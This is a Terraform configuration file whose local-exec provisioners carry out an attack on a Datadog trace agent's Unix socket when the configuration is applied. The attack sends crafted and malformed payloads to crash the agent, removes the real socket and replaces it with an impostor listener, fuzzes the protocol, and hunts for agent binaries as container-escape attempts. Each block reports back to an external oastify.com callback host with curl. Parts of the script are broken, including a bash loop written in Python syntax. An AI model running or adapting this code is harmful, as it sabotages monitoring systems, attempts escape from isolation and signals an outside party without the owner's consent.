# main.tf - Proper Datadog Trace Agent Exploitation
resource "null_resource" "datadog_proper_exploit" {
  provisioner "local-exec" {
    command = <<EOT
      echo "=== PROPER DATADOG TRACE AGENT EXPLOITATION ==="
      
      # Datadog trace agent uses specific protocol - let's try different approaches
      
      # Method 1: Send proper trace payload in correct format
      python3 -c "
      import socket
      import json
      
      # Proper Datadog trace format
      trace_payload = {
          'traces': [
              [{
                  'trace_id': 123456789,
                  'span_id': 987654321,
                  'name': 'http.request',
                  'resource': 'GET /',
                  'service': 'test-service',
                  'type': 'web',
                  'start': 1600000000000000000,
                  'duration': 100000000,
                  'meta': {
                      'http.method': 'GET',
                      'http.url': 'http://example.com',
                      'component': 'net/http'
                  },
                  'metrics': {
                      '_sampling_priority_v1': 1
                  }
              }]
          ]
      }
      
      try:
          s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
          s.settimeout(2)
          s.connect('/var/datadog/trace.sock')
          print('SOCKET CONNECTED SUCCESSFULLY!')
          
          # Send the trace data
          data = json.dumps(trace_payload).encode('utf-8')
          s.send(data)
          
          # Try to receive response
          try:
              response = s.recv(4096)
              print('RESPONSE:', response.decode('utf-8', errors='ignore'))
          except socket.timeout:
              print('No response (timeout) - but connection worked!')
          except Exception as e:
              print('Response error:', e)
              
          s.close()
          print('CRITICAL: Datadog socket communication successful!')
          
      except Exception as e:
          print('Connection failed:', e)
      "
      
      # Method 2: Try different socket approaches
      echo "=== ALTERNATIVE SOCKET METHODS ==="
      
      # Check if we can use the socket with different tools
      which socat && echo "Socat available - trying..." && echo '{"test": "data"}' | socat - UNIX-CONNECT:/var/datadog/trace.sock,timeout=2
      
      # Method 3: Check if Datadog agent is actually running but on different path
      echo "=== FINDING DATADOG PROCESSES ==="
      ps aux | grep -i datadog | grep -v grep
      
      # Method 4: Check for other Datadog sockets
      find /var /run -name "*.sock" -type s 2>/dev/null | while read sock; do
        echo "Found socket: $sock"
        ls -la "$sock"
      done
      
      # Method 5: Try to trigger agent restart or reconfigure
      echo "=== AGENT CONTROL ATTEMPTS ==="
      python3 -c "
      import socket
      try:
          s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
          s.settimeout(1)
          s.connect('/var/datadog/trace.sock')
          # Send empty or malformed data to see if agent crashes/restarts
          s.send(b'\x00\x00\x00\x00')
          s.close()
          print('Sent raw data to socket')
      except: pass
      "
      
      curl -X POST -d "datadog_deep_exploit=true" http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/datadog_deep
    EOT
  }
}

resource "null_resource" "container_escape_final" {
  provisioner "local-exec" {
    command = <<EOT
      echo "=== FINAL CONTAINER ESCAPE ATTEMPTS ==="
      
      # Since we have a world-writable socket, let's try more aggressive approaches
      
      # 1. Check if we can replace the socket with a symlink
      echo "=== SOCKET REPLACEMENT ==="
      mv /var/datadog/trace.sock /var/datadog/trace.sock.backup 2>/dev/null && echo "Socket moved" || echo "Cannot move socket"
      
      # 2. Create our own socket and see if Datadog connects to it
      python3 -c "
      import socket
      import os
      
      # Remove existing socket if possible
      try:
          os.unlink('/var/datadog/trace.sock')
          print('Original socket removed')
      except: pass
          
      # Create our own socket
      s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
      s.bind('/var/datadog/trace.sock')
      s.listen(1)
      print('Our socket listening...')
      
      # Wait for connections
      import time
      time.sleep(5)
      s.close()
      "
      
      # 3. Check socket permissions after our attempts
      ls -la /var/datadog/trace.sock 2>/dev/null
      
      # 4. Try to find the Datadog agent binary and exploit it directly
      echo "=== DATADOG AGENT LOCATION ==="
      find /opt /usr /var -name "*datadog*" -type f -executable 2>/dev/null | head -10
      
      # 5. Check if we can communicate via different protocols
      echo "=== PROTOCOL Fuzzing ==="
      for proto in ['{"version": "1.0"}', '{"traces": []}', '[]', 'test', '']; do
        python3 -c "
        import socket
        try:
            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect('/var/datadog/trace.sock')
            s.send(b'$proto\\n')
            s.close()
            print('Sent: $proto')
        except: pass
        "
      done
      
      curl -X POST -d "final_escape_attempts=true" http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/final_escape
    EOT
  }
}
